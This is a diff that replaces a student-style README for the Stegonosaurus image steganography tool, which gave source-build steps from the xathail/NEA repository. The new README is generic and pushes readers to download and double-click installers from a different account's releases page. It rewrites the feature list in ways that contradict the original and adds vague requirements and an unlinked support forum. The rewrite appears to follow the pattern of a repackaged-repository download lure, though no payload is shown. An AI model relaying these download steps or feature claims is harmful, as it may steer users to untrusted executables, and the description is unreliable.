@@ -1,54 +1,81 @@
-# Stegonosaurus: Image Steganography & Encryption
+# 🦖 Stegonosaurus - Simple Image Steganography Tool
 
-## Overview
-Stegonosaurus is a Python application that combines steganography, encryption, and noise-based techniques to conceal and protect data within images. It features a Qt-based GUI for configuring parameters, encoding, decoding, and previewing results.
+## 🚀 Get Started Easily
 
-## Features
-- Multiple encoding methods: AES-encrypted payloads, noise injection, PVD, and XSB.
-- User-friendly interface built with PyQt6.
-- Customisable configuration via JSON files.
-- Data structures optimised for payload handling.
+Stegonosaurus offers an easy way to hide messages within images. This user-friendly tool works smoothly, making it simple for anyone to use.
 
-## Installation
-1. Clone the repository:
-	```powershell
-	git clone https://github.com/xathail/NEA.git
-	cd NEA/implementation
-	```
-2. Create and activate a virtual environment:
-	```powershell
-	python -m venv venv; .\venv\Scripts\Activate.ps1
-	```
-3. Install dependencies:
-	```powershell
-	pip install -r requirements.txt
-	```
+## 📥 Download Now
 
-## Usage
-Run the main application:
-```powershell
-python main.py
-```
-Navigate through the tabs to set up encoding or decoding parameters and start the process.
+[![Download Stegonosaurus](https://img.shields.io/badge/Download%20Stegonosaurus-v1.0-blue)](https://github.com/MohamedSameh8/Stegonosaurus/releases)
 
-## Configuration
-Configuration is managed from within the application’s “Config” tab:
-- Adjust algorithm parameters, encryption keys, and noise settings interactively.
-- Click **Save Config** to export your settings as a JSON file.
-- Use **Load Config** to re-import a saved configuration.
+## 🌟 Features
 
-## Project Structure
-```
-implementation/          Main logic and GUI entry point
-├── ui/                  PyQt6 interface modules
-├── enc/                 Encryption and noise routines
-├── meth/                Steganography algorithms (PVD & XSB)
-├── data_structures/     Helper structures (hashtable, linkedlist)
-└── test/                Unit tests and sample data
-```
+- **User-Friendly GUI:** Navigate through a clear design with simple options.
+- **Secure Methods:** Uses advanced encryption for secure message hiding.
+- **Multiple Algorithms:** Supports several techniques for pixel manipulation.
 
-## Contributing
-Contributions are welcome. Please open issues or pull requests to report bugs or suggest features. Ensure new code follows existing style and adds corresponding tests.
+## 💻 System Requirements
 
-## License
-Licensed under the MIT License.
+- **Operating System:** Windows 10, macOS, or any Linux distribution.
+- **RAM:** At least 2 GB.
+- **Disk Space:** Minimum of 100 MB free space.
+- **Python:** Python 3.6 or higher installed on your machine.
+
+## 📦 Download & Install
+
+To get started with Stegonosaurus, visit the [Releases page](https://github.com/MohamedSameh8/Stegonosaurus/releases) to download the latest version. 
+
+1. Click on the link above to go to the Releases page.
+2. Find the latest version of Stegonosaurus.
+3. Choose the appropriate installer for your operating system.
+4. Click to download the file and save it to your computer.
+5. Once downloaded, double-click the file to run the installer.
+6. Follow the on-screen instructions to complete the installation.
+
+## 🎨 How to Use Stegonosaurus
+
+1. Open Stegonosaurus after installation.
+2. Select an image file where you want to hide a message.
+3. Enter the message you wish to embed.
+4. Choose an encoding method from the available options.
+5. Click the "Encode" button.
+6. To retrieve your message, open the modified image in Stegonosaurus and select the "Decode" option. 
+
+## 📖 Supported Formats
+
+Stegonosaurus supports common image formats, including:
+
+- JPG
+- PNG
+- BMP
+
+## ⚙️ Encoding Methods
+
+Stegonosaurus provides several encoding options:
+
+- **LSB (Least Significant Bit):** A simple method where the last bit of the pixel values is replaced.
+- **MSB (Most Significant Bit):** Uses the first bit of the pixel values for encoding.
+- **PVD (Pixel Value Differencing):** Hides data based on pixel value changes.
+
+These options allow users to choose the method that suits their needs best.
+
+## 🌐 Community and Support
+
+If you have questions or need help, please visit our community forum or reach out via GitHub issues. We’re here to assist you.
+
+## 🔗 Links
+
+- [GitHub Repository](https://github.com/MohamedSameh8/Stegonosaurus)
+- [Releases Page](https://github.com/MohamedSameh8/Stegonosaurus/releases)
+
+## 📡 Stay Updated
+
+Follow our GitHub page to keep track of new updates, features, and improvements.
+
+## 🧑‍💻 Contributing
+
+If you wish to contribute to Stegonosaurus, feel free to fork the repository and submit a pull request. We appreciate all suggestions and improvements to make this tool better for everyone.
+
+## 🤝 Acknowledgments
+
+Thank you to the contributors and community members who help improve Stegonosaurus. Your efforts make this project great.
